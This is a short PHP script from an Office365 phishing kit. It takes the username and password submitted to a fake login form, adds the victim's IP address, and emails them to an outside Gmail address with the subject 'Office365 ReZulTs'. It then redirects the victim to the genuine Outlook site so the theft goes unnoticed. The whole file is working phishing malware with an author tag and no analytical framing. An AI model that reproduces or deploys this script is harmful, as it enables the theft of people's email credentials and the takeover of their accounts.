<?
$ip = getenv("REMOTE_ADDR");
$message .= "----------------------Result--------------------------------\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------------Created By ICQ : 703959893---------------------\n";
$send = "charkjosh32@gmail.com";
$subject = "Office365 ReZulTs";
$headers = "From: ReZult<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers); 
header("Location: https://outlook.office365.com");
	  

?>